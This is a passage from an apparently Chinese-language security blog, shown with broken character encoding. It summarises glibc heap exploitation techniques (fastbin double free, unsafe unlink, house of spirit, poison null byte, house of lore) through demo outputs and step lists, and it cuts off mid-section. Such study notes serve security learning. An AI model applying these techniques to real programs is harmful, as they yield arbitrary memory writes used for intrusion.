class="hljs-number">8</span>): <span class="hljs-number">0x188f030</span><br>ç¬¬ä¸‰æ¬¡ <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>ç”³è¯·3ä¸ªchunkï¼Œp1ï¼Œp2ï¼Œp3</li><li>free p1ï¼Œå†freep2ï¼Œå½¢æˆ p2 -&gt; p1</li><li>å†free p1 å½¢æˆ p1 -&gt; p2 -&gt; p1</li><li>è¿ç»­ç”³è¯·ä¸‰æ¬¡chunk</li></ul><p><strong>ç»“æœ</strong></p><p>å¾—åˆ°ä¸¤ä¸ªç›¸åŒåœ°å€çš„chunk</p><h2 id="Fastbin-dup-into-stack-â€“-Double-free"><a href="#Fastbin-dup-into-stack-â€“-Double-free" class="headerlink" title="Fastbin_dup_into_stack â€“ Double free"></a>Fastbin_dup_into_stack â€“ Double free</h2><p><strong>åŸç†</strong></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">é€šè¿‡æ¬ºéª— malloc ä½¿å¾—è¿”å›ä¸€ä¸ªæŒ‡å‘å—æ§ä½ç½®çš„æŒ‡é’ˆï¼ˆæœ¬ä¾‹ä¸ºæ ˆä¸Šï¼‰<br>é€šè¿‡ malloc ç”³è¯·åˆ° <span class="hljs-number">0x7ffec12adb40</span>.<br>å…ˆç”³è¯·<span class="hljs-number">3</span> ä¸ª chunk<br>chunk a: <span class="hljs-number">0x209a010</span><br>chunk b: <span class="hljs-number">0x209a030</span><br>chunk c: <span class="hljs-number">0x209a050</span><br>free æ‰ chunk a<br>å¦‚æœè¿˜å¯¹ <span class="hljs-number">0x209a010</span> è¿›è¡Œ free, ç¨‹åºä¼šå´©æºƒã€‚å› ä¸º <span class="hljs-number">0x209a010</span> ç°åœ¨æ˜¯ fastbin çš„ç¬¬ä¸€ä¸ª<br>å…ˆå¯¹ b <span class="hljs-number">0x209a030</span> è¿›è¡Œ free<br>æ¥ä¸‹æ¥å°±å¯ä»¥å¯¹ <span class="hljs-number">0x209a010</span> å†æ¬¡è¿›è¡Œ free äº†, ç°åœ¨å·²ç»ä¸æ˜¯å®ƒåœ¨ fastbin çš„ç¬¬ä¸€ä¸ªäº†<br>ç°åœ¨ fastbin çš„é“¾è¡¨æ˜¯ [ <span class="hljs-number">0x209a010</span>, <span class="hljs-number">0x209a030</span>, <span class="hljs-number">0x209a010</span> ] æ¥ä¸‹æ¥é€šè¿‡ä¿®æ”¹ <span class="hljs-number">0x209a010</span> ä¸Šçš„å†…å®¹æ¥è¿›è¡Œæ”»å‡».<br>ç¬¬ä¸€æ¬¡ malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a010</span><br>ç¬¬äºŒæ¬¡ malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a030</span><br>ç°åœ¨ fastbin è¡¨ä¸­åªå‰© [ <span class="hljs-number">0x209a010</span> ] äº†<br>æ¥ä¸‹æ¥å¾€ <span class="hljs-number">0x209a010</span> æ ˆä¸Šå†™ä¸€ä¸ªå‡çš„ sizeï¼Œè¿™æ · malloc ä¼šè¯¯ä»¥ä¸ºé‚£é‡Œæœ‰ä¸€ä¸ªç©ºé—²çš„ chunkï¼Œä»è€Œç”³è¯·åˆ°æ ˆä¸Šå»<br>ç°åœ¨è¦†ç›– <span class="hljs-number">0x209a010</span> å‰é¢çš„ <span class="hljs-number">8</span> å­—èŠ‚ï¼Œä¿®æ”¹ fd æŒ‡é’ˆæŒ‡å‘ stack_var å‰é¢ <span class="hljs-number">0x20</span> çš„ä½ç½®<br>ç¬¬ä¸‰æ¬¡ malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a010</span>, æŠŠæ ˆåœ°å€æ”¾åˆ° fastbin é“¾è¡¨ä¸­<br>è¿™ä¸€æ¬¡ malloc(<span class="hljs-number">8</span>) å°±ç”³è¯·åˆ°äº†æ ˆä¸Šå»: <span class="hljs-number">0x7ffec12adb40</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>ç”³è¯·3ä¸ªchunkï¼Œp1ï¼Œp2ï¼Œp3</li><li>free p1ï¼Œå†freep2ï¼Œå½¢æˆ p2 -&gt; p1</li><li>å†free p1 å½¢æˆ p1 -&gt; p2 -&gt; p1</li><li>ä¿®æ”¹p1çš„fdæŒ‡å‘ä»»æ„åœ°å€ï¼Œæ ˆä¸Šéƒ½å¯</li><li>è¿ç»­ç”³è¯·ä¸‰æ¬¡chunk</li><li>ç¬¬å››æ¬¡ç”³è¯·chunkä¼šç”³è¯·åˆ°ç›®æ ‡åœ°å€</li></ul><p><strong>ç»“æœ</strong></p><p>ä»»æ„åœ°å€è¯»å†™</p><h2 id="Fastbin-dup-consolidate"><a href="#Fastbin-dup-consolidate" class="headerlink" title="Fastbin_dup_consolidate"></a>Fastbin_dup_consolidate</h2><p><strong>åŸç†</strong></p><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">ç”³è¯·ä¸¤ä¸ª fastbin èŒƒå›´å†…çš„ chunk: p1=0xbba010 p2=0xbba030<br>å…ˆ free p1<br>å»ç”³è¯· largebin å¤§å°çš„ chunkï¼Œè§¦å‘ malloc_consolidate(): p3=0xbba050<br>å› ä¸º malloc_consolidate(), p1 ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­<br>è¿™æ—¶å€™ p1 ä¸åœ¨ fastbin é“¾è¡¨çš„å¤´éƒ¨äº†ï¼Œæ‰€ä»¥å¯ä»¥å†æ¬¡ free p1 é€ æˆ<span class="hljs-built_in"> double </span>free<br>ç°åœ¨ fastbin å’Œ unsortedbin ä¸­éƒ½æ”¾ç€ p1 çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ malloc ä¸¤æ¬¡éƒ½åˆ° p1: 0xbba010 0xbba010<br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><pre><code>- 1.free ä¸€ä¸ªfastbinå¤§å°çš„chunk 1- 2.ç”³è¯·ä¸€ä¸ªlargin bin å¤§å°çš„chunkï¼Œæ­¤æ—¶å› ä¸º malloc_consolidate(), chunk1 ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­- å†æ¬¡free chunk1</code></pre><p><strong>ç»“æœ</strong></p><p>â€‹ç°åœ¨ fastbin å’Œ unsortedbin ä¸­éƒ½æ”¾ç€ p1 çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ malloc ä¸¤æ¬¡éƒ½åˆ° p1: 0xbba010 0xbba010ï¼Œä»»æ„åœ°å€è¯»å†™</p><h2 id="Unsafe-Unlink"><a href="#Unsafe-Unlink" class="headerlink" title="Unsafe_Unlink"></a>Unsafe_Unlink</h2><p><strong>åŸç†</strong></p><figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xl">å½“ä½ åœ¨å·²çŸ¥ä½ç½®æœ‰æŒ‡å‘æŸä¸ªåŒºåŸŸçš„æŒ‡é’ˆæ—¶ï¼Œå¯ä»¥è°ƒç”¨ unlink<br>æœ€å¸¸è§çš„æƒ…å†µæ˜¯æ˜“å—æ”»å‡»çš„ç¼“å†²åŒºï¼Œå¯èƒ½ä¼šæº¢å‡ºå¹¶å…·æœ‰å…¨å±€æŒ‡é’ˆ<br>æœ¬ç»ƒä¹ çš„é‡ç‚¹æ˜¯ä½¿ç”¨ free ç ´åå…¨å±€ chunk0_ptr æ¥å®ç°ä»»æ„å†…å­˜å†™å…¥<br><br>å…¨å±€å˜é‡ chunk0_ptr åœ¨ <span class="hljs-number">0</span>x6020d0, æŒ‡å‘ <span class="hljs-number">0</span>x161e010<br>æˆ‘ä»¬æƒ³è¦ç ´åçš„ chunk åœ¨ <span class="hljs-number">0</span>x161e0a0<br>åœ¨ chunk0 é‚£é‡Œä¼ªé€ ä¸€ä¸ª chunk<br>æˆ‘ä»¬è®¾ç½® <span class="hljs-function"><span class="hljs-title">fake</span> chunk çš„ 'next_free_chunk' (ä¹Ÿå°±æ˜¯ fd) æŒ‡å‘ &amp;chunk0_ptr ä½¿å¾— P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk = P.<br>æˆ‘ä»¬è®¾ç½® <span class="hljs-function"><span class="hljs-title">fake</span> chunk çš„ 'previous_free_chunk' (ä¹Ÿå°±æ˜¯ bk) æŒ‡å‘ &amp;chunk0_ptr ä½¿å¾— P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd = P.<br>é€šè¿‡ä¸Šé¢çš„è®¾ç½®å¯ä»¥ç»•è¿‡æ£€æŸ¥: (P-&gt;<span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd != P) == False<br>Fake chunk çš„ fd: <span class="hljs-number">0</span>x6020b8<br>Fake chunk çš„ bk: <span class="hljs-number">0</span>x6020c0<br><br>ç°åœ¨å‡è®¾ chunk0 ä¸­å­˜åœ¨ä¸€ä¸ªæº¢å‡ºæ¼æ´ï¼Œå¯ä»¥æ›´æ”¹ chunk1 çš„æ•°æ®<br>é€šè¿‡ä¿®æ”¹ chunk1 ä¸­ prev_size çš„å¤§å°ä½¿å¾— chunk1 åœ¨ free çš„æ—¶å€™è¯¯ä»¥ä¸º å‰é¢çš„ free chunk æ˜¯ä»æˆ‘ä»¬ä¼ªé€ çš„ free chunk å¼€å§‹çš„<br>å¦‚æœæ­£å¸¸çš„ free chunk0 çš„è¯ chunk1 çš„ prev_size åº”è¯¥æ˜¯ <span class="hljs-number">0</span>x90 ä½†ç°åœ¨è¢«æ”¹æˆäº† <span class="hljs-number">0</span>x80<br>æ¥ä¸‹æ¥é€šè¿‡æŠŠ chunk1 çš„ prev_inuse æ”¹æˆ <span class="hljs-number">0</span> æ¥æŠŠä¼ªé€ çš„å †å—æ ‡è®°ä¸ºç©ºé—²çš„å †å—<br><br>ç°åœ¨é‡Šæ”¾æ‰ chunk1ï¼Œä¼šè§¦å‘ unlinkï¼Œåˆå¹¶ä¸¤ä¸ª free chunk<br>æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ chunk0_ptr è¦†ç›–è‡ªèº«ä»¥æŒ‡å‘ä»»æ„ä½ç½®<br>chunk0_ptr ç°åœ¨æŒ‡å‘æˆ‘ä»¬æƒ³è¦çš„ä½ç½®ï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥è¦†ç›–æˆ‘ä»¬çš„ victim stringã€‚<br>ä¹‹å‰çš„å€¼æ˜¯: Hello!~<br>æ–°çš„å€¼æ˜¯: BBBBAAAA<br><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><p>â€‹fd = goal - 0x18 </p><p>â€‹bk = goal - 0x10</p><p><strong>ç»“æœ</strong></p><p>ä»»æ„åœ°å€å†™</p><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><p><strong>åŸç†</strong></p><figure class="highlight dns"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">è¿™ä¸ªä¾‹å­æ¼”ç¤ºäº† house of spirit æ”»å‡»<br>æˆ‘ä»¬å°†æ„é€ ä¸€ä¸ª fake chunk ç„¶åé‡Šæ”¾æ‰å®ƒï¼Œè¿™æ ·å†æ¬¡ç”³è¯·çš„æ—¶å€™å°±ä¼šç”³è¯·åˆ°å®ƒ<br>è¦†ç›–ä¸€ä¸ªæŒ‡å‘ fastbin çš„æŒ‡é’ˆ<br>è¿™å—åŒºåŸŸ (é•¿åº¦ä¸º: <span class="hljs-number">80</span>) åŒ…å«ä¸¤ä¸ª chunk. ç¬¬ä¸€ä¸ªåœ¨ <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7268</span> ç¬¬äºŒä¸ªåœ¨ <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e72a8</span>.<br>æ„é€  fake chunk çš„ sizeï¼Œè¦æ¯” chunk å¤§ <span class="hljs-number">0</span>x10ï¼ˆå› ä¸º chunk å¤´ï¼‰ï¼ŒåŒæ—¶è¿˜è¦ä¿è¯å±äº fastbinï¼Œå¯¹äº fastbin æ¥è¯´ prev_inuse ä¸ä¼šæ”¹å˜ï¼Œä½†æ˜¯å…¶ä»–ä¸¤ä¸ªä½éœ€è¦æ³¨æ„éƒ½è¦ä½ <span class="hljs-number">0</span><br>next chunk çš„å¤§å°ä¹Ÿè¦æ³¨æ„ï¼Œè¦å¤§äº <span class="hljs-number">0</span>x10 å°äº av-&gt;system_memï¼ˆ<span class="hljs-number">128</span>kbï¼‰<br>ç°åœ¨ï¼Œæˆ‘ä»¬æ‹¿ä¼ªé€ çš„é‚£ä¸ª fake chunk çš„åœ°å€è¿›è¡Œ free, <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span>.<br>free!<br>ç°åœ¨ malloc çš„æ—¶å€™å°†ä¼šæŠŠ <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span> ç»™è¿”å›å›æ¥<br>malloc(<span class="hljs-number">0</span>x30): <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span><br>Finish!<br><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><p>æ„é€ fake fastbin chunkï¼Œfreeæ‰è¿™ä¸ªchunkï¼Œå†æ¬¡ç”³è¯·å¯ä»¥æ‹¿å›è¿™ä¸ªchunk</p><p>å‰ææœ‰ä¸€ä¸ªå¯æ§çš„æŒ‡é’ˆ</p><p><strong>ç»“æœ</strong></p><p>ä»»æ„åœ°å€å†™ï¼Œå‰ææœ‰å¯æ§æŒ‡é’ˆ</p><h2 id="Posion-null-byte"><a href="#Posion-null-byte" class="headerlink" title="Posion_null_byte"></a>Posion_null_byte</h2><p><strong>åŸç†</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">å½“å­˜åœ¨ off by null çš„æ—¶å€™å¯ä»¥ä½¿ç”¨è¯¥æŠ€æœ¯<br>ç”³è¯· <span class="hljs-number">0x100</span> çš„ chunk a<br>a åœ¨: <span class="hljs-number">0x1eb2010</span><br>å› ä¸ºæˆ‘ä»¬æƒ³è¦æº¢å‡º chunk aï¼Œæ‰€ä»¥éœ€è¦çŸ¥é“ä»–çš„å®é™…å¤§å°: <span class="hljs-number">0x108</span><br>b: <span class="hljs-number">0x1eb2120</span><br>c: <span class="hljs-number">0x1eb2330</span><br>å¦å¤–å†ç”³è¯·äº†ä¸€ä¸ª chunk cï¼š<span class="hljs-number">0x1eb2440</span>ï¼Œé˜²æ­¢ <span class="hljs-built_in">free</span> çš„æ—¶å€™ä¸ top chunk å‘ç”Ÿåˆå¹¶çš„æƒ…å†µ<br>ä¼šæ£€æŸ¥ chunk size ä¸ next chunk çš„ prev_size æ˜¯å¦ç›¸ç­‰ï¼Œæ‰€ä»¥è¦åœ¨åé¢ä¸€ä¸ª <span class="hljs-number">0x200</span> æ¥ç»•è¿‡æ£€æŸ¥<br>b çš„ size: <span class="hljs-number">0x211</span><br>å‡è®¾æˆ‘ä»¬å†™ chunk a çš„æ—¶å€™å¤šå†™äº†ä¸€ä¸ª <span class="hljs-number">0x00</span> åœ¨ b çš„ size çš„ p ä½ä¸Š<br>b ç°åœ¨çš„ size: <span class="hljs-number">0x200</span><br>c çš„ prev_size æ˜¯ <span class="hljs-number">0x210</span><br>ä½†ä»–æ ¹æ® chunk b çš„ size æ‰¾çš„æ—¶å€™ä¼šæ‰¾åˆ° b+<span class="hljs-number">0x1f0</span> é‚£é‡Œï¼Œæˆ‘ä»¬å°†ä¼šæˆåŠŸç»•è¿‡ chunk çš„æ£€æµ‹ chunksize(P) == <span class="hljs-number">0x200</span> == <span class="hljs-number">0x200</span> == prev_size (next_chunk(P))<br>ç”³è¯·ä¸€ä¸ª <span class="hljs-number">0x100</span> å¤§å°çš„ b1: <span class="hljs-number">0x1eb2120</span><br>ç°åœ¨æˆ‘ä»¬ <span class="hljs-built_in">malloc</span> äº† b1 ä»–å°†ä¼šæ”¾åœ¨ b çš„ä½ç½®ï¼Œè¿™æ—¶å€™ c çš„ prev_size ä¾ç„¶æ˜¯: <span class="hljs-number">0x210</span><br>ä½†æ˜¯æˆ‘ä»¬ä¹‹å‰å†™ <span class="hljs-number">0x200</span> é‚£ä¸ªåœ°æ–¹å·²ç»æ”¹æˆäº†: f0<br>æ¥ä¸‹æ¥ <span class="hljs-built_in">malloc</span> <span class="hljs-string">'b2'</span>, ä½œä¸º <span class="hljs-string">'victim'</span> chunk.<br>b2 ç”³è¯·åœ¨: <span class="hljs-number">0x1eb2230</span><br>ç°åœ¨ b2 å¡«å……çš„å†…å®¹æ˜¯:<br>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br>ç°åœ¨å¯¹ b1 å’Œ c è¿›è¡Œ <span class="hljs-built_in">free</span> å› ä¸º c çš„ prev_size æ˜¯ <span class="hljs-number">0x210</span>ï¼Œæ‰€ä»¥ä¼šæŠŠä»–ä¿©ç»™åˆå¹¶ï¼Œä½†æ˜¯è¿™æ—¶å€™é‡Œé¢è¿˜åŒ…å« b2 å‘.<br>è¿™æ—¶å€™æˆ‘ä»¬ç”³è¯·ä¸€ä¸ª <span class="hljs-number">0x300</span> å¤§å°çš„ chunk å°±å¯ä»¥è¦†ç›–ç€ b2 äº†<br>d ç”³è¯·åˆ°äº†: <span class="hljs-number">0x1eb2120</span>ï¼Œæˆ‘ä»¬å¡«å……ä¸€ä¸‹ d ä¸º <span class="hljs-string">"D"</span><br>ç°åœ¨ b2 çš„å†…å®¹å°±æ˜¯:<br>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD<br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>ç”³è¯·0x100å¤§å°çš„chunk aï¼Œ0x200å¤§å°çš„chunk bï¼Œchunk c é˜²åˆå¹¶</li><li>free b</li><li>é€šè¿‡off-by-oneè¦†å†™chunk bçš„sizeä»0x211-&gt;0x200 </li><li>chunk bä¸­b+0x1f0çš„ä½ç½®æ”¾prev_size = 0x200 æˆ‘ä»¬å°†ä¼šæˆåŠŸç»•è¿‡ chunk çš„æ£€æµ‹ chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))</li><li>ç”³è¯·ä¸€ä¸ª0x100çš„b1ï¼Œb1ä¼šæ”¾åˆ°bçš„ä½ç½®ï¼Œcçš„prev_sizeä»ç„¶æ˜¯0x210ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹‹å‰å†™ 0x200 é‚£ä¸ªåœ°æ–¹å·²ç»æ”¹æˆäº†: f0</li><li>ç”³è¯·b2ï¼Œä½œä¸º â€˜victimâ€™ chunk </li><li>free b1 å’Œ cï¼Œç”±äºcçš„prev_sizeæ˜¯0x210ï¼Œä¼šåˆå¹¶b1å’Œcï¼Œæ­¤æ—¶b2ä»åœ¨</li></ul><p><strong>ç»“æœ</strong></p><p>åœ¨ä¸€ä¸ªå¤§çš„freeå †å—ä¸­å­˜åœ¨ä¸€ä¸ªæœªè¢«freeçš„å †å—</p><h2 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House_of_lore"></a>House_of_lore</h2><p><strong>åŸç†</strong></p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">å®šä¹‰äº†ä¸¤ä¸ªæ•°ç»„stack_buffer_1 åœ¨ <span class="hljs-number">0x7ffc7a946070</span><br>stack_buffer_2 åœ¨ <span class="hljs-number">0x7ffc7a946050</span><br>ç”³è¯·ç¬¬ä¸€å—å±äº fastbin çš„ chunk åœ¨ <span class="hljs-number">0x211c010</span><br>åœ¨æ ˆä¸Šä¼ªé€ ä¸€å— fake chunk<br>è®¾ç½® fd æŒ‡é’ˆæŒ‡å‘ victim chunkï¼Œæ¥ç»•è¿‡ small <span class="hljs-keyword">bin </span>çš„æ£€æŸ¥ï¼Œè¿™æ ·çš„è¯å°±èƒ½æŠŠå †æ ˆåœ°å€æ”¾åœ¨åˆ° small <span class="hljs-keyword">bin </span>çš„åˆ—è¡¨ä¸Š<br>è®¾ç½® stack_buffer_1 çš„ <span class="hljs-keyword">bk </span>æŒ‡é’ˆæŒ‡å‘ stack_buffer_2ï¼Œè®¾ç½® stack_buffer_2 çš„ fd æŒ‡é’ˆæŒ‡å‘ stack_buffer_1 æ¥ç»•è¿‡æœ€åä¸€ä¸ª malloc ä¸­ small <span class="hljs-keyword">bin </span>corrupted, è¿”å›æŒ‡å‘æ ˆä¸Šå‡å—çš„æŒ‡é’ˆå¦å¤–å†åˆ†é…ä¸€å—ï¼Œé¿å…ä¸ top chunk åˆå¹¶ <span class="hljs-number">0x211c080</span><br>Free victim chunk <span class="hljs-number">0x211c010</span>, ä»–ä¼šè¢«æ’å…¥åˆ° fastbin ä¸­<br><br>æ­¤æ—¶ victim chunk çš„ fdã€<span class="hljs-keyword">bk </span>ä¸ºé›¶<br>victim-&gt;fd: (nil)<br>victim-&gt;<span class="hljs-keyword">bk: </span>(nil)<br><br>è¿™æ—¶å€™å»ç”³è¯·ä¸€ä¸ª chunkï¼Œè§¦å‘ fastbin çš„åˆå¹¶ä½¿å¾— victim è¿›å» unsortedbin ä¸­å¤„ç†ï¼Œæœ€ç»ˆè¢«æ•´ç†åˆ° small <span class="hljs-keyword">bin </span>ä¸­ <span class="hljs-number">0x211c010</span><br>ç°åœ¨ victim chunk çš„ fd å’Œ <span class="hljs-keyword">bk </span>æ›´æ–°ä¸º unsorted <span class="hljs-keyword">bin </span>çš„åœ°å€<br>victim-&gt;fd: <span class="hljs-number">0x7f6610ee7bd8</span><br>victim-&gt;<span class="hljs-keyword">bk: </span><span class="hljs-number">0x7f6610ee7bd8</span><br><br>ç°åœ¨æ¨¡æ‹Ÿä¸€ä¸ªå¯ä»¥è¦†ç›– victim çš„ <span class="hljs-keyword">bk </span>æŒ‡é’ˆçš„æ¼æ´ï¼Œè®©ä»–çš„ <span class="hljs-keyword">bk </span>æŒ‡é’ˆæŒ‡å‘æ ˆä¸Š<br>ç„¶åç”³è¯·è·Ÿç¬¬ä¸€ä¸ª chunk å¤§å°ä¸€æ ·çš„ chunk<br>ä»–åº”è¯¥ä¼šè¿”å› victim chunk å¹¶ä¸”å®ƒçš„ <span class="hljs-keyword">bk </span>ä¸ºä¿®æ”¹æ‰çš„ victim çš„ <span class="hljs-keyword">bk</span><br><span class="hljs-keyword"></span>æœ€å malloc ä¸€æ¬¡ä¼šè¿”å› victim-&gt;<span class="hljs-keyword">bk </span>æŒ‡å‘çš„é‚£é‡Œ<br>p4 = malloc(<span class="hljs-number">100</span>)<br><br>åœ¨æœ€åä¸€ä¸ª malloc ä¹‹åï¼Œstack_buffer_2 çš„ fd æŒ‡é’ˆå·²æ›´æ”¹ <span class="hljs-number">0x7f6610ee7bd8</span><br><br>p4 åœ¨æ ˆä¸Š <span class="hljs-number">0x7ffc7a946080</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>åœ¨æ ˆä¸Šå®šä¹‰äº†ä¸¤ä¸ªæ•°ç»„ stack1ï¼Œstack2</li><li>ç”³è¯·äº†ä¸€å— fastbin chunkï¼Œåœ¨æ ˆä¸Šä¼ªé€ ä¸€å— fake chunkï¼Œè®¾ç½®stack1 fd -&gt; victim chunkï¼Œç»•è¿‡small binæ£€æŸ¥</li><li>è®¾ç½® stack_buffer_1 çš„ bk æŒ‡é’ˆæŒ‡å‘ stack_buffer_2 &amp; è®¾ç½® stack_buffer_2 çš„ fd æŒ‡é’ˆæŒ‡å‘ stack_buffer_1 </li><li>å†åˆ†é…ä¸ªchunkï¼Œé¿å…å’Œtop chunk åˆå¹¶</li><li>free victim chunkï¼Œä¼šè¢«æ”¾å…¥fastbinä¸­åŒæ—¶fdã€bkä¸º0</li><li>å†ç”³è¯·ä¸€ä¸ªlarge bin chunkè§¦å‘xxä½¿å¾—victim chunk è¿›å…¥ unsortedbin</li><li>fd å’Œ bk è¢«æ›´æ–°ä¸ºmain_arena_88</li><li>å­˜åœ¨ä¸€ä¸ªæ¼æ´å¯ä»¥ä½¿å¾—victimçš„bk -&gt; stack 1</li><li>ç”³è¯·ä¸€ä¸ªå¤§å°ç›¸åŒçš„chunkå–å‡ºvictim chunk,å¹¶ä¸”å®ƒçš„bkä¸ºä¿®æ”¹æ‰çš„victimçš„bk</li><li>å†æ¬¡mallocä¸€æ¬¡ä¼šè¿”å› victim -&gt; bk æŒ‡å‘çš„é‚£é‡Œï¼Œä¹Ÿå°±æ˜¯stack1ï¼Œstack2 fd æŒ‡é’ˆä¹Ÿæ›´æ”¹main_arena_88</li></ul><p><strong>ç»“æœ</strong></p><p>ä»»æ„åœ°å€malloc</p><h2 id="Overlapping-chunks"><a href="#Overlapping-chunks" class="headerlink" title="Overlapping_chunks"></a>Overlapping_chunks</h2><p><strong>åŸç†</strong></p><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs smali">è¿™æ˜¯ä¸€ä¸ªç®€å•çš„å †å—é‡å 